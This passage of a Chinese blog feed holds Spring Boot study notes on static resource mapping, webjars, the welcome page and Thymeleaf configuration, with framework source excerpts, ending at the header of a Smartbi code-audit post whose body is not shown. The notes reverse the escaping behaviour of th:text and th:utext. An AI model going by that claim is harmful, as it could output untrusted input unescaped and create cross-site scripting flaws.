class="hljs-keyword">class</span> <span class="hljs-title class_">ServerProperties</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Server HTTP port.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> Integer port;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Network address to which the server should bind.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> InetAddress address;<br><br>    <span class="hljs-meta">@NestedConfigurationProperty</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ErrorProperties</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorProperties</span>();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Strategy for handling X-Forwarded-* headers.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> ForwardHeadersStrategy forwardHeadersStrategy;<br>    ...<br></code></pre></td></tr></table></figure><p>那么 yaml 中可以写的配置即为</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251306965.png"></p><h3 id="小结：-2"><a href="#小结：-2" class="headerlink" title="小结："></a>小结：</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">xxxxAutoConfigurartion：自动配置类</font></strong></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">xxxxProperties： 配置属性类  </font></strong></p><p><strong>– debug: true  查看生效的自动配置类</strong></p><hr><h1 id="4、SpringBoot-Web-开发"><a href="#4、SpringBoot-Web-开发" class="headerlink" title="4、SpringBoot Web 开发"></a>4、SpringBoot Web 开发</h1><h2 id="4-1-静态资源"><a href="#4-1-静态资源" class="headerlink" title="4.1 静态资源"></a>4.1 静态资源</h2><h3 id="4-1-1-静态资源映射规则"><a href="#4-1-1-静态资源映射规则" class="headerlink" title="4.1.1 静态资源映射规则"></a>4.1.1 静态资源映射规则</h3><p><font style="color:#080808;background-color:#ffffff;">WebMvcAutoConfiguration -&gt; EnableWebMvcConfiguration -&gt; addResourceHandlers</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> &#123;<br>    <span class="hljs-comment">//resourceProperties.isAddMappings() 读取静态资源配置</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resourceProperties.isAddMappings()) &#123;<br>        logger.debug(<span class="hljs-string">&quot;Default resource handling disabled&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//WebJars 是一种把 JS、CSS 打包成 jar 的方式，这里让 /webjars/... 直接访问到 jar 包里的静态文件</span><br>    addResourceHandler(registry, <span class="hljs-string">&quot;/webjars/**&quot;</span>, <span class="hljs-string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);<br>    <span class="hljs-comment">//映射普通静态资源</span><br>    addResourceHandler(registry, <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern(), (registration) -&gt; &#123;<br>        registration.addResourceLocations(<span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations());<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.servletContext != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ServletContextResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(<span class="hljs-built_in">this</span>.servletContext, SERVLET_LOCATION);<br>            registration.addResourceLocations(resource);<br>        &#125;<br>    &#125;);<br>    &#125;<br>    <span class="hljs-comment">//提供一个更简化的调用方式，只传 URL 模式和物理路径，不需要自己写 Consumer</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandler</span><span class="hljs-params">(ResourceHandlerRegistry registry, String pattern, String... locations)</span> &#123;<br>        addResourceHandler(registry, pattern, (registration) -&gt; registration.addResourceLocations(locations));<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandler</span><span class="hljs-params">(ResourceHandlerRegistry registry, String pattern,</span><br><span class="hljs-params">                                    Consumer&lt;ResourceHandlerRegistration&gt; customizer)</span> &#123;<br>        <span class="hljs-keyword">if</span> (registry.hasMappingForPattern(pattern)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">ResourceHandlerRegistration</span> <span class="hljs-variable">registration</span> <span class="hljs-operator">=</span> registry.addResourceHandler(pattern);<br>        customizer.accept(registration);<br>        registration.setCachePeriod(getSeconds(<span class="hljs-built_in">this</span>.resourceProperties.getCache().getPeriod()));<br>        registration.setCacheControl(<span class="hljs-built_in">this</span>.resourceProperties.getCache().getCachecontrol().toHttpCacheControl());<br>        registration.setUseLastModified(<span class="hljs-built_in">this</span>.resourceProperties.getCache().isUseLastModified());<br>        customizeResourceHandlerRegistration(registration);<br>    &#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">Webjars本质就是以jar包的方式引入静态资源</font></p><p><a href="https://www.webjars.org/">https://www.webjars.org/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jquery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">要使用jQuery，只要要引入jQuery对应版本的pom依赖即可</font></p><p><font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);"></font></p><p>另一种规则：<font style="color:rgba(0, 0, 0, 0.9);">&#x2F;**</font></p><p><font style="color:#080808;background-color:#ffffff;">WebProperties -&gt; getStaticLocations -&gt; staticLocations -&gt; CLASSPATH_RESOURCE_LOCATIONS -&gt; </font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">//以下四个目录存放的静态资源可以被识别<br>&quot;classpath:/META-INF/resources/&quot;,<br>&quot;classpath:/resources/&quot;, <br>&quot;classpath:/static/&quot;, <br>&quot;classpath:/public/&quot;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String[] getStaticLocations() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.staticLocations;<br>&#125;<br><br><span class="hljs-keyword">private</span> String[] staticLocations = CLASSPATH_RESOURCE_LOCATIONS;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; <span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;</span>,<br>                                                               <span class="hljs-string">&quot;classpath:/resources/&quot;</span>, <span class="hljs-string">&quot;classpath:/static/&quot;</span>, <span class="hljs-string">&quot;classpath:/public/&quot;</span> &#125;;<br></code></pre></td></tr></table></figure><hr><p>优先级：resources &gt; static &gt; public</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304624.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304716.png"></p><h3 id="4-1-2-首页"><a href="#4-1-2-首页" class="headerlink" title="4.1.2 首页"></a>4.1.2 首页</h3><p><font style="color:rgba(0, 0, 0, 0.9);">静态资源文件夹下的所有 index.html 页面</font></p><p><font style="color:rgba(0, 0, 0, 0.9);"></font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> WelcomePageHandlerMapping <span class="hljs-title function_">welcomePageHandlerMapping</span><span class="hljs-params">(ApplicationContext applicationContext,</span><br><span class="hljs-params">                                                           FormattingConversionService mvcConversionService, ResourceUrlProvider mvcResourceUrlProvider)</span> &#123;<br>    <span class="hljs-type">WelcomePageHandlerMapping</span> <span class="hljs-variable">welcomePageHandlerMapping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WelcomePageHandlerMapping</span>(<br>        <span class="hljs-comment">//检测模板引擎（Thymeleaf、Freemarker 等）是否可用，以判断欢迎页是模板还是静态文件</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateAvailabilityProviders</span>(applicationContext), <br>        <span class="hljs-comment">//查找模板、静态文件</span><br>        applicationContext, <br>        <span class="hljs-comment">//查找实际的欢迎页资源</span><br>        getWelcomePage(),<br>        <span class="hljs-comment">//欢迎页匹配路径模式</span><br>        <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern()<br>    );<br>    <span class="hljs-comment">//设置拦截器</span><br>    welcomePageHandlerMapping.setInterceptors(<br>        getInterceptors(mvcConversionService, mvcResourceUrlProvider)<br>    );<br>    <span class="hljs-comment">//设置 CORS</span><br>    welcomePageHandlerMapping.setCorsConfigurations(<br>        getCorsConfigurations()<br>    );<br>    <span class="hljs-keyword">return</span> welcomePageHandlerMapping;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 getWelcomePage()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Resource <span class="hljs-title function_">getWelcomePage</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//遍历静态资源位置</span><br>    <span class="hljs-keyword">for</span> (String location : <span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations()) &#123;<br>        <span class="hljs-type">Resource</span> <span class="hljs-variable">indexHtml</span> <span class="hljs-operator">=</span> getIndexHtml(location);<br>        <span class="hljs-keyword">if</span> (indexHtml != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> indexHtml;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//检查 ServletContext 下的欢迎页</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> getServletContext();<br>    <span class="hljs-keyword">if</span> (servletContext != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> getIndexHtml(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(servletContext, SERVLET_LOCATION));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-Thymeleaf模板引擎"><a href="#4-2-Thymeleaf模板引擎" class="headerlink" title="4.2 Thymeleaf模板引擎"></a>4.2 <font style="color:rgba(0, 0, 0, 0.9);">Thymeleaf模板引擎</font></h2><p><a href="https://www.thymeleaf.org/">https://www.thymeleaf.org/</a></p><p><a href="https://github.com/thymeleaf/thymeleaf">https://github.com/thymeleaf/thymeleaf</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304509.png"></p><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--thymeleaf--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.9);">Thymeleaf的自动配置类：ThymeleafProperties</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.thymeleaf&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThymeleafProperties</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Charset</span> <span class="hljs-variable">DEFAULT_ENCODING</span> <span class="hljs-operator">=</span> StandardCharsets.UTF_8;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;classpath:/templates/&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.html&quot;</span>;<br></code></pre></td></tr></table></figure><p>那么只要在 templates 中写 .html 页面就可以完成 <font style="color:rgba(0, 0, 0, 0.9);">Thymeleaf 模板</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-comment">// 在 templates 目录下的所有页面，只能通过 controller 来跳转</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304919.png"></p><h3 id="4-2-1-Thymeleaf-语法学习"><a href="#4-2-1-Thymeleaf-语法学习" class="headerlink" title="4.2.1 Thymeleaf 语法学习"></a>4.2.1 Thymeleaf 语法学习</h3><p><a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p><h4 id="yaml-配置："><a href="#yaml-配置：" class="headerlink" title="yaml 配置："></a>yaml 配置：</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">thymeleaf:</span><br>    <span class="hljs-attr">prefix:</span> <span class="hljs-string">classpath:/templates/</span><span class="hljs-comment">#指定模板所在的目录</span><br>    <span class="hljs-attr">check-template-location:</span> <span class="hljs-literal">true</span><span class="hljs-comment">#检查模板路径是否存在</span><br>    <span class="hljs-attr">cache:</span> <span class="hljs-literal">false</span><span class="hljs-comment">#是否缓存，开发模式下设置为false，避免改了模板还要重启服务器，线上设置为true，可以提高性能。</span><br>    <span class="hljs-attr">suffix:</span> <span class="hljs-string">.html</span><span class="hljs-comment">#表示模板文件的后缀</span><br>    <span class="hljs-attr">encoding:</span> <span class="hljs-string">UTF-8</span><span class="hljs-comment">#设置模板文件的字符编码</span><br>    <span class="hljs-attr">content-type:</span> <span class="hljs-string">text/html</span><span class="hljs-comment">#定渲染后返回的 HTTP 响应类型</span><br>    <span class="hljs-attr">mode:</span> <span class="hljs-string">HTML5</span><span class="hljs-comment">#Thymeleaf 模板解析模式</span><br></code></pre></td></tr></table></figure><h4 id="th-属性"><a href="#th-属性" class="headerlink" title="th 属性"></a><font style="color:rgba(0, 0, 0, 0.9);">th 属性</font></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304599.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251306398.png"></p><ol><li><strong><font style="color:rgb(77, 77, 77);">th:text</font></strong><font style="color:rgb(77, 77, 77);"> ：设置当前元素的文本内容，相同功能的还有</font><strong><font style="color:rgb(77, 77, 77);">th:utext</font></strong><font style="color:rgb(77, 77, 77);">，两者的区别在于前者不会转义html标签，后者会。优先级不高：order&#x3D;7</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:value</font></strong><font style="color:rgb(77, 77, 77);">：设置当前元素的value值，类似修改指定属性的还有</font><strong><font style="color:rgb(77, 77, 77);">th:src</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:href</font></strong><font style="color:rgb(77, 77, 77);">。优先级不高：order&#x3D;6</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:each</font></strong><font style="color:rgb(77, 77, 77);">：遍历循环元素，和</font><strong><font style="color:rgb(77, 77, 77);">th:text</font></strong><font style="color:rgb(77, 77, 77);">或</font><strong><font style="color:rgb(77, 77, 77);">th:value</font></strong><font style="color:rgb(77, 77, 77);">一起使用。注意该属性修饰的标签位置，详细往后看。优先级很高：order&#x3D;2</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:if</font></strong><font style="color:rgb(77, 77, 77);">：条件判断，类似的还有</font><strong><font style="color:rgb(77, 77, 77);">th:unless</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:switch</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:case</font></strong><font style="color:rgb(77, 77, 77);">。优先级较高：order&#x3D;3</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:insert</font></strong><font style="color:rgb(77, 77, 77);">：代码块引入，类似的还有</font><strong><font style="color:rgb(77, 77, 77);">th:replace</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:include</font></strong><font style="color:rgb(77, 77, 77);">，三者的区别较大，若使用不恰当会破坏html结构，常用于公共代码块提取的场景。优先级最高：order&#x3D;1</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:fragment</font></strong><font style="color:rgb(77, 77, 77);">：定义代码块，方便被</font><strong><font style="color:rgb(77, 77, 77);">th:insert</font></strong><font style="color:rgb(77, 77, 77);">引用。优先级最低：order&#x3D;8</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:object</font></strong><font style="color:rgb(77, 77, 77);">：声明变量，一般和*{}一起配合使用，达到偷懒的效果。优先级一般：order&#x3D;4</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:attr</font></strong><font style="color:rgb(77, 77, 77);">：修改任意属性，实际开发中用的较少，因为有丰富的</font><font style="color:rgb(78, 161, 219) !important;">其他</font><font style="color:rgb(77, 77, 77);">th属性帮忙，类似的还有</font><strong><font style="color:rgb(77, 77, 77);">th:attrappend</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:attrprepend</font></strong><font style="color:rgb(77, 77, 77);">。优先级一般：order&#x3D;5</font></li></ol><p><font style="color:rgb(79, 79, 79);"></font></p><h4 id="标准表达式语法"><a href="#标准表达式语法" class="headerlink" title="标准表达式语法"></a><font style="color:rgb(79, 79, 79);">标准表达式语法</font></h4><ul><li><font style="color:rgb(51, 51, 51);">Simple expressions:</font><ul><li><font style="color:rgb(51, 51, 51);">Variable Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;${...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Selection Variable Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;*{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Message Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;#{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Link URL Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;@{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Fragment Expressions: </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;~{...}&lt;/font&gt;**</code></li></ul></li></ul><h5 id="…-代码块表达式"><a href="#…-代码块表达式" class="headerlink" title="~{…} 代码块表达式"></a><font style="color:rgb(77, 77, 77);">~{…} 代码块表达式</font></h5><ul><li><font style="color:rgb(77, 77, 77);">推荐：</font><code>~{templatename::fragmentname}</code></li><li><font style="color:rgb(77, 77, 77);">支持：</font><code>~{templatename::#id}</code></li></ul><p><font style="color:rgb(77, 77, 77);">templatename：模版名，Thymeleaf会根据模版名解析完整路径：</font><code>/resources/templates/templatename.html</code><font style="color:rgb(77, 77, 77);">，要注意文件的路径。</font></p><p><font style="color:rgb(77, 77, 77);">fragmentname：片段名，Thymeleaf通过th:fragment声明定义代码块，即：</font><code>th:fragment=&quot;fragmentname&quot;</code></p><p><font style="color:rgb(77, 77, 77);">id：HTML的id选择器，使用时要在前面加上#号，不支持class选择器。</font></p><h5 id="…-消息表达式"><a href="#…-消息表达式" class="headerlink" title="#{…} 消息表达式"></a><font style="color:rgb(77, 77, 77);">#{…} 消息表达式</font></h5><h5 id="…-链接表达式"><a href="#…-链接表达式" class="headerlink" title="@{…} 链接表达式"></a><font style="color:rgb(77, 77, 77);">@{…} 链接表达式</font></h5><p><font style="color:rgb(77, 77, 77);">链接表达式好处：不管是静态资源的引用，form表单的请求，凡是链接都可以用@{…} 。这样可以动态获取项目路径，即便项目名变了，依然可以正常访问。</font></p><p><strong><font style="color:rgb(77, 77, 77);">链接表达式结构</font></strong><font style="color:rgb(77, 77, 77);">:</font></p><ul><li><font style="color:rgb(77, 77, 77);">无参：@{&#x2F;xxx}</font></li><li><font style="color:rgb(77, 77, 77);">有参：@{&#x2F;xxx(k1&#x3D;v1,k2&#x3D;v2)} 对应url结构：xxx?k1&#x3D;v1&amp;k2&#x3D;v2</font></li><li><font style="color:rgb(77, 77, 77);">引入本地资源：@{&#x2F;项目本地的资源路径}</font></li><li><font style="color:rgb(77, 77, 77);">引入外部资源：@{&#x2F;webjars&#x2F;资源在jar包中的路径}</font></li></ul><h5 id="…-变量表达式"><a href="#…-变量表达式" class="headerlink" title="${…}变量表达式"></a><font style="color:rgb(77, 77, 77);">${…}变量表达式</font></h5><p>变量表达式功能：</p><ul><li>可以获取对象的属性和方法</li><li>可以使用ctx，vars，locale，request，response，session，servletContext内置对象</li><li>可以使用dates，numbers，strings，objects，arrays，lists，sets，maps等内置方法（重点介绍）</li></ul><p>常用的内置对象：</p><ul><li>ctx ：上下文对象。</li><li>vars ：上下文变量。</li><li>locale：上下文的语言环境。</li><li>request：（仅在web上下文）的 HttpServletRequest 对象。</li><li>response：（仅在web上下文）的 HttpServletResponse 对象。</li><li>session：（仅在web上下文）的 HttpSession 对象。</li><li>servletContext：（仅在web上下文）的 ServletContext 对象</li></ul><p>常用的内置方法:</p><ul><li>strings：字符串格式化方法，常用的Java方法它都有。比如：equals，equalsIgnoreCase，length，trim，toUpperCase，toLowerCase，indexOf，substring，replace，startsWith，endsWith，contains，containsIgnoreCase等</li><li>numbers：数值格式化方法，常用的方法有：formatDecimal等</li><li>bools：布尔方法，常用的方法有：isTrue，isFalse等</li><li>arrays：数组方法，常用的方法有：toArray，length，isEmpty，contains，containsAll等</li><li>lists，sets：集合方法，常用的方法有：toList，size，isEmpty，contains，containsAll，sort等</li><li>maps：对象方法，常用的方法有：size，isEmpty，containsKey，containsValue等</li><li>dates：日期方法，常用的方法有：format，year，month，hour，createNow等</li></ul><h5 id="…-选择变量表达式"><a href="#…-选择变量表达式" class="headerlink" title="*{…} 选择变量表达式"></a>*{…} 选择变量表达式</h5><h2 id="4-3-MVC自动配置原理"><a href="#4-3-MVC自动配置原理" class="headerlink" title="4.3 MVC自动配置原理"></a>4.3 MVC自动配置原理</h2><p><a href="https://springdoc.cn/spring-boot/web.html#web.servlet">https://springdoc.cn/spring-boot/web.html#web.servlet</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi v8.5 代码审计</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
